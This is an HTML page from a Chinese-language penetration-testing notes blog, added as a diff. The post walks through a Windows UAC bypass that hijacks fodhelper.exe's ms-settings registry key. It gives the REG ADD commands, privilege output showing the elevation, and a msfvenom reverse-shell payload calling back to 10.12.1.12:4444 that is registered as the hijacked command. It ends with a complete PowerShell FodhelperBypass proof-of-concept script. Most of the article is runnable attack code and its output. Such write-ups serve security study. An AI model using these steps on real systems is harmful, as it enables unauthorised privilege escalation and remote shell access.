@@ -1,0 +1,517 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon-light.ico">
+  <link rel="icon" type="image/png" href="/img/favicon-light.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="渗透测试笔记、日常问题记录">
+  <meta name="author" content="Ayu">
+  <meta name="keywords" content="">
+  <title>Bypass UAC Fodhelper - Black Book</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/dracula.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"0xhc.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Ayu's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/assets/blog/84707606_p0.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Bypass UAC Fodhelper">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-07 13:35" pubdate>
+        2020年11月7日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Bypass UAC Fodhelper</h1>
+            
+            <div class="markdown-body">
+              <p>Bypass UAC fodhelper.exe</p>
+<a id="more"></a>
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">sigcheck.exe <span class="hljs-literal">-m</span> C:\Windows\System32\fodhelper.exe<br></code></pre></div></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="hljs-comment">&lt;!-- Copyright (c) Microsoft Corporation --&gt;</span><br>&lt;assembly<br>   xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;<br>   xmlns:asmv3=&quot;urn:schemas-microsoft-com:asm.v3&quot;<br>   manifestVersion=&quot;1.0&quot;&gt;<br> <span class="hljs-tag">&lt;<span class="hljs-name">assemblyIdentity</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;win32&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;6595b64144ccf1df&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft.Windows.FodHelper&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;5.1.0.0&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Features On Demand Helper UI<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">trustInfo</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">security</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>          &lt;requestedExecutionLevel<br>            level=&quot;requireAdministrator&quot;<br>          /&gt;<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">security</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">trustInfo</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">asmv3:application</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">asmv3:windowsSettings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dpiAware</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">dpiAware</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">autoElevate</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">autoElevate</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">asmv3:windowsSettings</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">asmv3:application</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">assembly</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+<p>可以发现该应用程序是由管理用户运行的，因此需要使用完整的 <code>administrator</code> 访问令牌</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>    &lt;requestedExecutionLevel<br>    level=&quot;requireAdministrator&quot;<br>    /&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">requestedPrivileges</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<blockquote>
+<p><code>level=&#39;requireAdministrator&#39;</code>: The application runs using administrator permissions. The user who starts the application must be a member of the Administrators group. If the opening process isn’t running with administrative permissions, the system prompts for credentials.</p>
+</blockquote>
+<br/>
+
+<p>此外，<code>autoelevate</code> 标志被设置为 true，这允许可执行文件自动提升到高完整性，而不提示管理员用户是否同意</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">autoElevate</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">autoElevate</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<hr>
+<p>Process Monitor Filter:</p>
+<ul>
+<li>Process Name is fodhelper.exe</li>
+<li>Operation contains Reg</li>
+<li>Result is NAME NOT FOUND</li>
+<li>Path contains HKCU</li>
+</ul>
+<p>有如下条目：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\Command    NAME NOT FOUND<br></code></pre></div></td></tr></table></figure>
+<p>fodhelper.exe 应用程序试图查询 <code>HKCU:\Software\Classes\ms-settings\shell\open\command</code> 注册表键，但它返回 NAME NOT FOUND</p>
+<p>修改查询路径和规则以查看更多信息</p>
+<p>Close :</p>
+<ul>
+<li>Path contains HKCU</li>
+<li>Result is NAME NOT FOUND</li>
+</ul>
+<p>有如下条目：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\Command    NAME NOT FOUND<br>HKCR\ms<span class="hljs-literal">-settings</span>\Shell\Open\Command                     SUCCESS<br></code></pre></div></td></tr></table></figure>
+<p>在 HKCU 中未找到 <code>ms-settings\shell\open\command</code> 注册表键后，会立即访问 HKCR 中的相同表键</p>
+<p><img src="/assets/img/2020_11_07_bypass_uac_fodhelper/2020-11-07-2.15.43.png" srcset="/img/loading.gif" alt="Not Found"></p>
+<br/>
+
+<p>查看 <code>HKEY_CLASSES_ROOT\ms-settings\Shell\Open\Command</code> 内的键值：</p>
+<figure class="highlight haskell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haskell">(<span class="hljs-keyword">default</span>)          <span class="hljs-type">REG_SZ</span>    (<span class="hljs-title">value</span> <span class="hljs-title">not</span> <span class="hljs-title">set</span>)<br><span class="hljs-type">DelegateExecute</span>    <span class="hljs-type">REG_SZ</span>    &#123;xxxx-xxxx-xxxx-xxxx-xxxxxx&#125;<br></code></pre></div></td></tr></table></figure>
+<p>现在，可以通过在 HKCU 中创建这个丢失的表项，以劫持它获得高级别的权限</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command<br>REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command /v DelegateExecute /t REG_SZ<br></code></pre></div></td></tr></table></figure>
+<p>创建完成，再次运行 Process Monitor 查看输出</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command                    SUCCESS<br>HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command\DelegateExecute    SUCCESS<br></code></pre></div></td></tr></table></figure>
+<p>添加恶意值</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command /d <span class="hljs-string">&quot;cmd.exe&quot;</span> /f<br><br><span class="hljs-comment"># QUERY Value</span><br>REG QUERY HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command<br><br><span class="hljs-comment"># HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command</span><br><span class="hljs-comment">#     (Default)    REG_SZ    cmd.exe</span><br><span class="hljs-comment">#     DelegateExecute    REG_SZ</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>检查当前用户权限</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                          State<br>============================= ==================================== ========<br>SeShutdownPrivilege           Shut down the system                 Disabled<br>SeChangeNotifyPrivilege       Bypass traverse checking             Enabled<br>SeUndockPrivilege             Remove computer from docking station Disabled<br>SeIncreaseWorkingSetPrivilege Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span>       Disabled<br>SeTimeZonePrivilege           Change the time zone                 Disabled<br></code></pre></div></td></tr></table></figure>
+<p>运行 fodhelper.exe</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Start-Process</span> <span class="hljs-literal">-FilePath</span> C:\Windows\System32\fodhelper.exe<br></code></pre></div></td></tr></table></figure>
+<p>弹出 cmd 检查用户权限</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">Privilege Name                            Description                                                        State<br>========================================= ================================================================== ========<br>SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="hljs-keyword">for</span> a <span class="hljs-keyword">process</span>                                 Disabled<br>SeSecurityPrivilege                       Manage auditing and security log                                   Disabled<br>SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled<br>SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled<br>SeSystemProfilePrivilege                  Profile system performance                                         Disabled<br>SeSystemtimePrivilege                     Change the system time                                             Disabled<br>SeProfileSingleProcessPrivilege           Profile single <span class="hljs-keyword">process</span>                                             Disabled<br>SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled<br>SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled<br>SeBackupPrivilege                         Back up files and directories                                      Disabled<br>SeRestorePrivilege                        Restore files and directories                                      Disabled<br>SeShutdownPrivilege                       Shut down the system                                               Disabled<br>SeDebugPrivilege                          Debug programs                                                     Disabled<br>SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled<br>SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled<br>SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled<br>SeUndockPrivilege                         Remove computer from docking station                               Disabled<br>SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled<br>SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled<br>SeCreateGlobalPrivilege                   Create global objects                                              Enabled<br>SeIncreaseWorkingSetPrivilege             Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span>                                     Disabled<br>SeTimeZonePrivilege                       Change the time zone                                               Disabled<br>SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled<br>SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="hljs-keyword">for</span> another user <span class="hljs-keyword">in</span> the same session Disabled<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>Reverse High Mandatory Level Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.12.1.12 LPORT=4444 -f exe -o callme.exe<br></code></pre></div></td></tr></table></figure>
+<p>添加值</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command /d <span class="hljs-string">&quot;C:\Users\Public\Documents\callme.exe&quot;</span> /f<br></code></pre></div></td></tr></table></figure>
+<p>删除创建的项值</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">REG DELETE HKEY_CURRENT_USER\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell /f<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<hr>
+<p>使用 Powershell</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span>  </span><br><span class="hljs-comment">    This script is a proof of concept to bypass the User Access Control (UAC) via fodhelper.exe</span><br><span class="hljs-comment">    It creates a new registry structure in: &quot;HKCU:\Software\Classes\ms-settings\&quot; to perform an UAC bypass to start any application. </span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    ATTENTION: Do not try this on your productive machine! </span><br><span class="hljs-comment"><span class="hljs-doctag">.NOTES</span>  </span><br><span class="hljs-comment">    Function   : FodhelperBypass</span><br><span class="hljs-comment">    File Name  : FodhelperBypass.ps1 </span><br><span class="hljs-comment">    Author     : Christian B. - winscripting.blog </span><br><span class="hljs-comment"><span class="hljs-doctag">.LINK</span>  </span><br><span class="hljs-comment">    https://github.com/winscripting/UAC-bypass</span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span>  </span><br><span class="hljs-comment">     Load &quot;cmd.exe /c powershell.exe&quot; (it&#x27;s default):</span><br><span class="hljs-comment">     FodhelperBypass </span><br><span class="hljs-comment">     Load specific application:</span><br><span class="hljs-comment">     FodhelperBypass -program &quot;cmd.exe&quot;</span><br><span class="hljs-comment">     FodhelperBypass -program &quot;cmd.exe /c powershell.exe&quot;</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">#&gt;</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FodhelperBypass</span><span class="hljs-params">()</span></span><br>&#123; <br>    <span class="hljs-keyword">Param</span> (          <br>        [<span class="hljs-built_in">String</span>]<span class="hljs-variable">$program</span> = <span class="hljs-string">&quot;cmd /c start powershell.exe&quot;</span> <span class="hljs-comment">#default</span><br>    )<br><br>    <span class="hljs-comment">#Create registry structure</span><br>    <span class="hljs-built_in">New-Item</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Force</span><br>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DelegateExecute&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-literal">-Force</span><br>    <span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;(default)&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$program</span> <span class="hljs-literal">-Force</span><br><br>    <span class="hljs-comment">#Perform the bypass</span><br>    <span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;C:\Windows\System32\fodhelper.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span><br><br>    <span class="hljs-comment">#Remove registry structure</span><br>    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-number">3</span><br>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\&quot;</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span><br><br>&#125;<br></code></pre></div></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/BypassUAC/">BypassUAC</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/08/08_20_powershell_in_memory_injection/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PowerShell In-Memory Injection</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/06/13_10_tools_cmd_note/">
+                        <span class="hidden-mobile">Tools && Command</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
